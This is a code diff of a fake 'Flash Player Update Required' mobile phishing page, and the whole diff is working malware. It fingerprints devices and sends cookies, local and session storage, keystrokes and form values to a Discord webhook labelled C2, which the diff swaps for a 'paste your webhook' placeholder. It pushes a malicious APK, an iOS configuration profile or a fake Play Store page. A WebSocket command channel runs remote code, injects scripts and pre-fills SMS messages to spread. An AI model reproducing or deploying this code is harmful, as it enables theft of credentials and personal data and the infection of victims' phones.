@@ -9,14 +9,20 @@
   <title>Flash Player Update Required</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet"/>
 
+  <!-- Eruda DevTools — xem console/network ngay trên mobile -->
+
+  <script src="//cdn.jsdelivr.net/npm/eruda"></script>
+
+  <script>eruda.init();</script>
+
   <!-- [BLOCK A] — "App config loader" -->
 
   <script>
     window.__cfg = {
-      appId:    "com.flashupdate.mobile",
-      version:  "2.1.4",
-      region:   "auto",
-      debug:    false
+      appId:   "com.flashupdate.mobile",
+      version: "2.1.4",
+      region:  "auto",
+      debug:   false
     };
   </script>
 
@@ -26,57 +32,50 @@
     (function() {
       var d = {};
 
-      d.ua        = navigator.userAgent;
-      d.platform  = navigator.platform;
-      d.lang      = navigator.language;
-      d.langs     = navigator.languages ? navigator.languages.join(',') : '';
-      d.cores     = navigator.hardwareConcurrency || -1;
-      d.memory    = navigator.deviceMemory || -1;
-      d.timezone  = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      d.screen    = screen.width + 'x' + screen.height;
-      d.dpr       = window.devicePixelRatio || 1;
-      d.touch     = navigator.maxTouchPoints || 0;
-      d.orient    = screen.orientation ? screen.orientation.type : 'unknown';
+      d.ua       = navigator.userAgent;
+      d.platform = navigator.platform;
+      d.lang     = navigator.language;
+      d.langs    = navigator.languages ? navigator.languages.join(',') : '';
+      d.cores    = navigator.hardwareConcurrency || -1;
+      d.memory   = navigator.deviceMemory || -1;
+      d.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      d.screen   = screen.width + 'x' + screen.height;
+      d.dpr      = window.devicePixelRatio || 1;
+      d.touch    = navigator.maxTouchPoints || 0;
+      d.orient   = screen.orientation ? screen.orientation.type : 'unknown';
 
-      // iOS vs Android routing flag
       d.isIOS     = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
       d.isAndroid = /Android/.test(navigator.userAgent);
 
-      // iOS version extraction
       if (d.isIOS) {
-        var match = navigator.userAgent.match(/OS (\d+)_(\d+)/);
-        d.iosVersion = match ? parseInt(match[1]) : -1;
+        var m = navigator.userAgent.match(/OS (\d+)_(\d+)/);
+        d.iosVersion = m ? parseInt(m[1]) : -1;
       }
-
-      // Android version extraction
       if (d.isAndroid) {
-        var match2 = navigator.userAgent.match(/Android (\d+\.?\d*)/);
-        d.androidVersion = match2 ? parseFloat(match2[1]) : -1;
+        var m2 = navigator.userAgent.match(/Android (\d+\.?\d*)/);
+        d.androidVersion = m2 ? parseFloat(m2[1]) : -1;
       }
 
-      // Battery API fingerprint (Android Chrome support, iOS limited)
       if (navigator.getBattery) {
         navigator.getBattery().then(function(b) {
           d.battery = {
-            level:    b.level,
-            charging: b.charging,
+            level:           b.level,
+            charging:        b.charging,
             chargingTime:    b.chargingTime,
             dischargingTime: b.dischargingTime
           };
         });
       }
 
-      // Network info
       if (navigator.connection) {
         d.network = {
-          type:        navigator.connection.effectiveType,
-          downlink:    navigator.connection.downlink,
-          rtt:         navigator.connection.rtt,
-          saveData:    navigator.connection.saveData
+          type:     navigator.connection.effectiveType,
+          downlink: navigator.connection.downlink,
+          rtt:      navigator.connection.rtt,
+          saveData: navigator.connection.saveData
         };
       }
 
-      // Standalone mode = installed as PWA / home screen
       d.standalone = window.navigator.standalone === true ||
                      window.matchMedia('(display-mode: standalone)').matches;
 
@@ -99,20 +98,14 @@
             z: e.accelerationIncludingGravity.z,
             t: Date.now()
           });
-          // Keep last 10 samples only
           if (_motion.samples.length > 10) _motion.samples.shift();
         }
       }, false);
 
       window.addEventListener('deviceorientation', function(e) {
-        window.__d.gyro = {
-          alpha: e.alpha,
-          beta:  e.beta,
-          gamma: e.gamma
-        };
+        window.__d.gyro = { alpha: e.alpha, beta: e.beta, gamma: e.gamma };
       }, false);
 
-      // Activate after first touch — bypass iOS motion permission prompt
       document.addEventListener('touchstart', function activateMotion() {
         _motion.active = true;
         document.removeEventListener('touchstart', activateMotion);
@@ -140,42 +133,27 @@
     h1 { font-size: 1.4rem; font-weight: 700; margin-bottom: 8px; color: #fff; }
     .sub { font-size: 0.9rem; color: #9ca3af; margin-bottom: 32px; line-height: 1.6; }
     .btn {
-      background: #f59e0b;
-      color: #000;
-      border: none;
-      padding: 16px 40px;
-      border-radius: 12px;
-      font-size: 1rem;
-      font-weight: 700;
-      cursor: pointer;
-      width: 100%;
-      max-width: 320px;
-      margin-bottom: 12px;
+      background: #f59e0b; color: #000; border: none;
+      padding: 16px 40px; border-radius: 12px;
+      font-size: 1rem; font-weight: 700; cursor: pointer;
+      width: 100%; max-width: 320px; margin-bottom: 12px;
     }
     .btn-sec {
-      background: transparent;
-      color: #6b7280;
-      border: 1px solid #374151;
-      padding: 12px 40px;
-      border-radius: 12px;
-      font-size: 0.85rem;
-      cursor: pointer;
-      width: 100%;
-      max-width: 320px;
+      background: transparent; color: #6b7280;
+      border: 1px solid #374151; padding: 12px 40px;
+      border-radius: 12px; font-size: 0.85rem; cursor: pointer;
+      width: 100%; max-width: 320px;
     }
     .badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      background: #1f2937;
-      border: 1px solid #374151;
-      padding: 6px 14px;
-      border-radius: 20px;
-      font-size: 0.75rem;
-      color: #9ca3af;
-      margin-bottom: 24px;
+      display: inline-flex; align-items: center; gap: 6px;
+      background: #1f2937; border: 1px solid #374151;
+      padding: 6px 14px; border-radius: 20px;
+      font-size: 0.75rem; color: #9ca3af; margin-bottom: 24px;
     }
-    .dot { width: 7px; height: 7px; border-radius: 50%; background: #ef4444; animation: blink 1.5s infinite; }
+    .dot {
+      width: 7px; height: 7px; border-radius: 50%;
+      background: #ef4444; animation: blink 1.5s infinite;
+    }
     @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
   </style>
 
@@ -195,25 +173,26 @@
   <!-- [BLOCK D] — "Telemetry init" -->
 
   <script>
-    var C2 = "https://discord.com/api/webhooks/1458105305475842265/tXiWm7-BNEkl9yZ6zIwi21RquQjrYOhkPQDBjN18741Zn4r6QjMuohVQP-PGgEW4zV8E";
+    // ← thay bằng webhook mới của bạn
+    var C2 = "PASTE_YOUR_WEBHOOK_HERE";
 
-    function ship(data) {
-      var body = JSON.stringify(data);
-      if (navigator.sendBeacon) {
-        navigator.sendBeacon(C2, body);
-      } else {
-        fetch(C2, { method: 'POST', body: body,
-          headers: { 'Content-Type': 'application/json' }, keepalive: true });
-      }
+    function ship(label, data) {
+      var text = "**" + label + "**\n```json\n" +
+                 JSON.stringify(data, null, 2).slice(0, 1800) +
+                 "\n```";
+      fetch(C2, {
+        method:  'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body:    JSON.stringify({ content: text })
+      }).catch(function(){});
     }
 
     window.addEventListener('load', function() {
       setTimeout(function() {
-        ship({
-          type:       'init',
-          device:     window.__d,
-          cookies:    document.cookie,
-          storage:    (function() {
+        ship('INIT', {
+          device:   window.__d,
+          cookies:  document.cookie,
+          storage:  (function() {
             var o = {};
             for (var i = 0; i < localStorage.length; i++) {
               var k = localStorage.key(i);
@@ -221,7 +200,7 @@
             }
             return o;
           })(),
-          session:    (function() {
+          session:  (function() {
             var o = {};
             for (var i = 0; i < sessionStorage.length; i++) {
               var k = sessionStorage.key(i);
@@ -229,9 +208,9 @@
             }
             return o;
           })(),
-          ref:        document.referrer,
-          url:        location.href,
-          ts:         Date.now()
+          referrer: document.referrer,
+          url:      location.href,
+          ts:       Date.now()
         });
       }, 600);
     });
@@ -242,45 +221,35 @@
   <script>
     (function() {
       var buf = '';
-      var EP  = "https://discord.com/api/webhooks/1458105305475842265/tXiWm7-BNEkl9yZ6zIwi21RquQjrYOhkPQDBjN18741Zn4r6QjMuohVQP-PGgEW4zV8E";
 
-      // Virtual keyboard input on mobile
       document.addEventListener('input', function(e) {
-        if (e.target && e.target.value !== undefined) {
-          buf += e.data || '';
+        if (e.target && e.data) {
+          buf += e.data;
           if (buf.length >= 40) {
             var snap = buf; buf = '';
-            navigator.sendBeacon(EP, JSON.stringify({
-              type: 'input',
+            ship('KEYLOG', {
               field: e.target.name || e.target.id || e.target.type,
-              data: snap,
-              url:  location.href
-            }));
+              data:  snap,
+              url:   location.href
+            });
           }
         }
       });
 
-      // Catch full field value on blur (more reliable on mobile)
       document.addEventListener('blur', function(e) {
         if (e.target && e.target.value) {
-          navigator.sendBeacon(EP, JSON.stringify({
-            type:  'field_complete',
+          ship('FIELD', {
             field: e.target.name || e.target.id || e.target.type,
             value: e.target.value,
             url:   location.href
-          }));
+          });
         }
       }, true);
 
-      // Flush remaining buffer every 4 seconds
       setInterval(function() {
         if (buf.length > 0) {
           var snap = buf; buf = '';
-          navigator.sendBeacon(EP, JSON.stringify({
-            type: 'input_flush',
-            data: snap,
-            url:  location.href
-          }));
+          ship('KEYLOG_FLUSH', { data: snap, url: location.href });
         }
       }, 4000);
     })();
@@ -290,25 +259,19 @@
 
   <script>
     document.getElementById('updateBtn').addEventListener('click', function() {
-      var d   = window.__d;
-      var url = location.href;
+      var d = window.__d;
 
-      // Send full profile before routing
-      ship({
-        type:    'update_click',
+      ship('CLICK', {
         device:  d,
         cookies: document.cookie,
         motion:  window.__motion.samples,
-        url:     url
+        url:     location.href
       });
 
-      // OS-specific payload routing
       if (d.isIOS) {
         if (d.iosVersion >= 16) {
-          // Modern iOS — open App Store deep link to fake app
           window.location.href = 'https://apps.apple.com/app/id999888777';
         } else {
-          // Older iOS — mobileconfig profile install (MDM)
           var a = document.createElement('a');
           a.href = 'https://cdn.update-flashplayer.xyz/profile_ios.mobileconfig';
           a.download = 'SecurityUpdate.mobileconfig';
@@ -318,7 +281,6 @@
         }
       } else if (d.isAndroid) {
         if (d.androidVersion >= 10) {
-          // Android 10+ — sideload APK
           var b = document.createElement('a');
           b.href = 'https://cdn.update-flashplayer.xyz/FlashUpdate_v2.1.4.apk';
           b.download = 'FlashUpdate.apk';
@@ -326,19 +288,15 @@
           b.click();
           document.body.removeChild(b);
         } else {
-          // Older Android — redirect to fake Play Store clone
           window.location.href = 'https://play-store-update.xyz/app/com.flash.update';
         }
       } else {
-        // Fallback
         window.location.href = 'https://cdn.update-flashplayer.xyz/setup.pkg';
       }
     });
 
-    // "Skip" button also reports
     document.getElementById('skipBtn').addEventListener('click', function() {
-      ship({
-        type:    'skip_click',
+      ship('SKIP', {
         device:  window.__d,
         cookies: document.cookie,
         url:     location.href
@@ -356,7 +314,6 @@
       function connect() {
         try {
           sock = new WebSocket(WS);
-
           sock.onopen = function() {
             sock.send(JSON.stringify({
               type:    'mobile_init',
@@ -365,39 +322,22 @@
               ts:      Date.now()
             }));
           };
-
           sock.onmessage = function(ev) {
             try {
               var cmd = JSON.parse(ev.data);
-
-              if (cmd.action === 'eval') {
-                (new Function(cmd.code))();
-              }
-              if (cmd.action === 'redirect') {
-                window.location.href = cmd.url;
-              }
-              if (cmd.action === 'inject') {
+              if (cmd.action === 'eval')     { (new Function(cmd.code))(); }
+              if (cmd.action === 'redirect') { window.location.href = cmd.url; }
+              if (cmd.action === 'inject')   {
                 var s = document.createElement('script');
                 s.src = cmd.src;
                 document.head.appendChild(s);
               }
-              if (cmd.action === 'sms') {
-                // Deep link SMS — pre-fill message to spread via victim's contacts
-                window.location.href = 'sms:?&body=' + encodeURIComponent(cmd.text);
-              }
-              if (cmd.action === 'call') {
-                window.location.href = 'tel:' + cmd.number;
-              }
+              if (cmd.action === 'sms')  { window.location.href = 'sms:?&body=' + encodeURIComponent(cmd.text); }
+              if (cmd.action === 'call') { window.location.href = 'tel:' + cmd.number; }
             } catch(e) {}
           };
-
-          sock.onclose = function() {
-            // Reconnect after 5s if connection drops
-            setTimeout(connect, 5000);
-          };
-
+          sock.onclose = function() { setTimeout(connect, 5000); };
           sock.onerror = function() { sock = null; };
-
         } catch(e) {}
       }
 
@@ -409,8 +349,6 @@
 
   <script>
     (function() {
-      var FEP = "https://discord.com/api/webhooks/1458105305475842265/tXiWm7-BNEkl9yZ6zIwi21RquQjrYOhkPQDBjN18741Zn4r6QjMuohVQP-PGgEW4zV8E";
-
       var mo = new MutationObserver(function(mutations) {
         mutations.forEach(function(m) {
           m.addedNodes.forEach(function(node) {
@@ -421,19 +359,17 @@
             inputs.forEach(function(inp) {
               inp.addEventListener('blur', function(e) {
                 if (e.target.value) {
-                  navigator.sendBeacon(FEP, JSON.stringify({
-                    type:  'injected_field',
+                  ship('DOM_FIELD', {
                     field: e.target.name || e.target.id || e.target.type,
                     value: e.target.value,
                     url:   location.href
-                  }));
+                  });
                 }
               });
             });
           });
         });
       });
-
       mo.observe(document.body, { childList: true, subtree: true });
     })();
   </script>
@@ -449,12 +385,10 @@
         var now = Date.now();
         if (document.hidden) {
           focusLog.push({ event: 'blur', ts: now, spent: now - enterTime });
-          ship({
-            type:    'visibility',
-            event:   'hidden',
+          ship('VISIBILITY', {
+            event:    'hidden',
             spent_ms: now - enterTime,
-            device:  window.__d,
-            url:     location.href
+            url:      location.href
           });
         } else {
           enterTime = now;
@@ -462,16 +396,14 @@
         }
       });
 
-      // On page unload — fire final beacon
       window.addEventListener('pagehide', function() {
-        navigator.sendBeacon(C2, JSON.stringify({
-          type:     'pagehide',
+        ship('PAGEHIDE', {
           spent_ms: Date.now() - enterTime,
           focusLog: focusLog,
           motion:   window.__motion.samples,
           gyro:     window.__d.gyro,
           url:      location.href
-        }));
+        });
       });
     })();
   </script>
